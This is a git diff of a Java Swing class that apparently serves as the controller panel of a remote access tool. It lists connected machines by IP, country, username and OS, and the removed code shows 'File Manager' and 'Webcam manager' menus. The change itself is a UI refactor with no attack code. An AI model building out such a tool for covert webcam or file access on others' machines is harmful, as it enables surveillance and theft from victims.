@@ -5,15 +5,14 @@ import Connections.Streams;
 
 import GUI.Compiler.CompilerGUI;
 import GUI.TableUtils.Configuration.StateColumnRenderer;
-import GUI.TableUtils.Configuration.TableMenuListener;
 import GUI.TableUtils.Configuration.TableModel;
-import GUI.TableUtils.FileManager.Listener.FileManagerMenuListener;
-import GUI.TableUtils.Webcam.WebcamMenuListener;
+import GUI.TableUtils.Configuration.TablePopUpListener;
 import com.formdev.flatlaf.FlatDarkLaf;
 
 
 import javax.swing.*;
 import javax.swing.table.DefaultTableCellRenderer;
+import javax.swing.table.DefaultTableModel;
 import java.awt.*;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
@@ -25,7 +24,7 @@ public class JsGUI {
 
     private final String[] column = {"IP", "Country", "Tag", "Username", "Operating System", "Status"};
     private JPanel panel;
-    private JTable connectionTable;
+    private JTable connectionsTable;
     private JFrame mainGUI;
 
     private final ConcurrentHashMap<Socket, Streams> map;
@@ -75,9 +74,6 @@ public class JsGUI {
         // Menu
         addJMenu();
         //
-        // PopUp Menu
-        addPopUpMenu();
-        //
         // Panel
         addJPanel();
         //
@@ -85,45 +81,22 @@ public class JsGUI {
         setupTable();
         //
 
-
         mainGUI.setVisible(true);
     }
 
 
-    // Menus of table
-    private JPopupMenu popupMenu;
-    private JMenuItem fileManagerMenu;
-    private JMenuItem webcamMenu;
 
 
-    private void addPopUpMenu() {
-        popupMenu = new JPopupMenu();
-        fileManagerMenu = new JMenuItem("File Manager");
-        webcamMenu = new JMenuItem("Webcam manager");
-
-        // set actions
 
 
-        popupMenu.add(fileManagerMenu);
-        // add to popup
-
-        popupMenu.add(webcamMenu);
-
-    }
 
     private void addTable() {
-        TableModel tableModel = new TableModel(null, column);
-        connectionTable = new JTable(tableModel);
-        JScrollPane tableScroll = new JScrollPane(connectionTable);
-        connectionTable.setFocusable(false);
+        TableModel tableModel = new TableModel(column);
+        connectionsTable = new JTable(tableModel);
+        JScrollPane tableScroll = new JScrollPane(connectionsTable);
+        connectionsTable.setFocusable(false);
         tableScroll.setBounds(0, 0, 784, 780);
-        connectionTable.setComponentPopupMenu(popupMenu);
-
-
-        connectionTable.addMouseListener(new TableMenuListener(connectionTable));
-        webcamMenu.addActionListener(new WebcamMenuListener(connectionTable, map, this));
-        fileManagerMenu.addActionListener(new FileManagerMenuListener(connectionTable, map, this));
-
+        connectionsTable.addMouseListener(new TablePopUpListener(this));
 
         panel.add(tableScroll);
         mainGUI.add(panel);
@@ -140,25 +113,31 @@ public class JsGUI {
         DefaultTableCellRenderer alignRenderer = new DefaultTableCellRenderer();
         alignRenderer.setHorizontalAlignment(JLabel.CENTER);
 
-        for (int x = 0; x < connectionTable.getColumnCount(); x++) {
-            if (x == connectionTable.getColumnCount() - 1) {
-                connectionTable.getColumnModel().getColumn(x).setCellRenderer(columnRenderer);
+        for (int x = 0; x < connectionsTable.getColumnCount(); x++) {
+            if (x == connectionsTable.getColumnCount() - 1) {
+                connectionsTable.getColumnModel().getColumn(x).setCellRenderer(columnRenderer);
             } else {
-                connectionTable.getColumnModel().getColumn(x).setCellRenderer(alignRenderer);
+                connectionsTable.getColumnModel().getColumn(x).setCellRenderer(alignRenderer);
             }
         }
 
     }
 
+    public ConcurrentHashMap<Socket, Streams> getMap() {
+        return map;
+    }
 
     public JFrame getMainGUI() {
         return mainGUI;
     }
 
-    public JTable getConnectionTable() {
-        return connectionTable;
+    public JTable getConnectionsTable() {
+        return connectionsTable;
     }
 
+    public DefaultTableModel getConnectionsDefaultTableModel() {
+        return (DefaultTableModel) connectionsTable.getModel();
+    }
 
 
 }
